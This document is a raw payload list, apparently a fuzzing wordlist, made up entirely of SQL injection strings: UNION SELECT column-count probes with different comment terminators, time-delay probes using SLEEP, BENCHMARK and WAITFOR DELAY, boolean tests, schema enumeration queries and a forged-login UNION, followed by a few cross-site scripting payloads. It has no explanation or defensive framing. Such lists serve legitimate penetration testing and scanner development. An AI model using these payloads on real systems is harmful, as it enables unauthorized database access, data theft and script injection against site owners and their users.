UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
UNION ALL SELECT NULL 
UNION ALL SELECT NULL#
UNION ALL SELECT NULL-- 
UNION ALL SELECT SLEEP(5)-- 
' UNION ALL SELECT system_user(),user();#
UNION ALL SELECT USER()-- 
UNION ALL SELECT USER(),SLEEP(5)-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--	
'''''''''''''UNION SELECT '2
' UNION SELECT sum(columnname ) from tablename --
' UNION select table_schema,table_name FROM information_Schema.tables;#
' UNION SELECT @@version--
UNION SELECT @@VERSION,SLEEP(5),"'3
UNION SELECT @@VERSION,SLEEP(5),"'3'"#
UNION SELECT @@VERSION,SLEEP(5),3
UNION SELECT @@VERSION,SLEEP(5),USER(),4
UNION SELECT @@VERSION,SLEEP(5),USER(),4#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
waitfor delay '00:00:05'
waitfor delay '00:00:05'#
waitfor delay '00:00:05'--
'; waitfor delay('0:0:20')--
';WAITFOR DELAY '0:0:30'--
"));waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
;waitfor delay '0:0:5'--
WHERE 1=1 AND 1=0
WHERE 1=1 AND 1=0#
WHERE 1=1 AND 1=0--
WHERE 1=1 AND 1=1
WHERE 1=1 AND 1=1#
WHERE 1=1 AND 1=1--
%
"><svg onload=alert()>
'><script>alert('');</script>
<IMG "'"><script>alert()</script>'>
```
